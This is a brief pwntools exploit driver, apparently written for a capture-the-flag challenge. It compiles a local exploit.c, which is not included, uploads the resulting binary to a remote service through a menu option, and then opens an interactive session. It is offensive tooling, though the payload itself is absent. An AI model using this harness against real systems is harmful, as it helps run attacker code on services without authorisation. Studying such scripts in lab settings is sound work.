#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 0.0.0.0 --port 6379
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 2323)

def start_remote():
    '''Connect to the process on the remote host'''
    return connect(host, port)

def start_local():
    '''Connect to the process on the remote host'''
    return connect(host, port)

def start():
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local()
    else:
        return start_remote()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

os.system("gcc exploit.c -o exp")
exp_blob = open("exp", "rb").read()

slaf = lambda x,y: io.sendlineafter(x,y)
io = start()

slaf(b"> ", b"2")
slaf(b"Length: ", str(len(exp_blob)).encode())
sleep(0.5)
io.send(exp_blob)

io.interactive()

